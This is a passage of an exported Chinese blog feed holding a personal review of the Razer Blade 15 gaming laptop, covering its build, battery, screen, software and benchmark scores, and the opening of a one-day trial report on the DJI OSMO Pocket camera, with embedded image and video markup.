XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, 